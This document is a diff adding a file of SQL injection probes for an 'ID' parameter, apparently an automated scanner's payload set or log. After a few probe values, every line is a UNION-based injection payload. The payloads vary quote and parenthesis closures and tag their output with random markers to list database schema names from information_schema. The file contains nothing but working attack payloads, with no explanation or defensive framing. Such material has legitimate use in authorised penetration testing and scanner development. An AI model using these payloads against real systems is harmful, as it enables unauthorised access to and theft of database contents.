@@ -1,0 +1,37 @@
+ID:1
+ID:"
+ID:;
+ID:-1 union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1' union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1" union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1') union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1 union select 1,2,concat('N8gVB2vby3:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1' union select 1,2,concat('N8gVB2vby3:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1" union select 1,2,concat('N8gVB2vby3:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1') union select 1,2,concat('N8gVB2vby3:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1 union select 1,2,concat('j3kWksSfLg:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1' union select 1,2,concat('j3kWksSfLg:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1" union select 1,2,concat('j3kWksSfLg:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1') union select 1,2,concat('j3kWksSfLg:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1 union select 1,2,concat('W32VmIBk2X:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1' union select 1,2,concat('W32VmIBk2X:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1" union select 1,2,concat('W32VmIBk2X:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1') union select 1,2,concat('W32VmIBk2X:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1") union select 1,2,concat('W32VmIBk2X:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1) union select 1,2,concat('W32VmIBk2X:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1')) union select 1,2,concat('W32VmIBk2X:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1")) union select 1,2,concat('W32VmIBk2X:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1)) union select 1,2,concat('W32VmIBk2X:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1 union select 1,2,concat('3BMevXc8GA:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1' union select 1,2,concat('3BMevXc8GA:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1" union select 1,2,concat('3BMevXc8GA:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1') union select 1,2,concat('3BMevXc8GA:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1") union select 1,2,concat('3BMevXc8GA:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1) union select 1,2,concat('3BMevXc8GA:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1')) union select 1,2,concat('3BMevXc8GA:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1")) union select 1,2,concat('3BMevXc8GA:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1)) union select 1,2,concat('3BMevXc8GA:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1 union select 1,2,concat('z9siDODgO2:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1' union select 1,2,concat('z9siDODgO2:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1" union select 1,2,concat('z9siDODgO2:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1') union select 1,2,concat('z9siDODgO2:',group_concat(schema_name)) from information_schema.schemata -- 
